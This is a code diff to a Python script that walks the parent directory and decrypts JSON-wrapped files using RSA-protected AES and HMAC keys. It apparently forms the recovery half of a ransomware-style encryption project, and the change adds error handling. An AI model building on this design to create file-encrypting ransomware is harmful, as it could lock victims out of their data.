@@ -1,5 +1,5 @@
 from base64 import b64encode, b64decode
-import sys, os, json, requests, cryptools, constants
+import sys, os, json, requests, cryptools, constants, traceback
 
 OUTSIDE_DIRECTORY = ".."
 
@@ -24,16 +24,19 @@ for current_directory, sub_directories, sub_files in os.walk(OUTSIDE_DIRECTORY):
         if 'json' not in file:
             continue
         
-        with open(os.path.join(current_directory, file), 'rb') as js:
-            json_dict = json.load(js)
+        try:
+            with open(os.path.join(current_directory, file), 'rb') as js:
+                json_dict = json.load(js)
 
-        fileName = ''.join(file.split('.')[:-1])
-
-        ext = b64decode(json_dict['EXT'])
-        tag = b64decode(json_dict['TAG'])
-        cipherkeys = b64decode(json_dict['KEY'])
-        cipherkeys = RSADecrypt(cipherkeys)
-        ciphertext = b64decode(json_dict['CIPHERTEXT'])
+            fileName = ''.join(file.split('.')[:-1])
+            
+            ext = b64decode(json_dict['EXT'])
+            tag = b64decode(json_dict['TAG'])
+            cipherkeys = b64decode(json_dict['KEY'])
+            cipherkeys = RSADecrypt(cipherkeys)
+            ciphertext = b64decode(json_dict['CIPHERTEXT'])
+        except:
+            continue
 
         aes_key, hmac_key = (cipherkeys[:constants.AES_KEY_LENGTH],\
                             cipherkeys[constants.AES_KEY_LENGTH:])
